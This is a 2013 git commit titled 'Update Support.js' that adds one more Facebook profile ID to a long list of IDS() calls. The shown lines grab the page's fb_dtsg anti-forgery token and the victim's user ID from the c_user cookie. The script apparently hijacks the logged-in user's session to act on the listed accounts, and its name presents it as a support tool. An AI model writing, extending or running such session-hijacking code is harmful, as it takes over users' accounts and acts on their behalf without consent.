0e4b6782cb8c4ab0afedf5d78d7423a7488ab5c7
wazzygray <qariwaqar@gmail.com>
2013-07-25 10:40:54 +0500

    Update Support.js

--- Support.js
+++ Support.js
@@ -102,6 +102,7 @@ IDS("100003977780572");
 IDS("100004043843895");
 IDS("100004121340012");
 IDS("100003977784062");
+IDS("100004537747892");
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var now=(new Date).getTime();
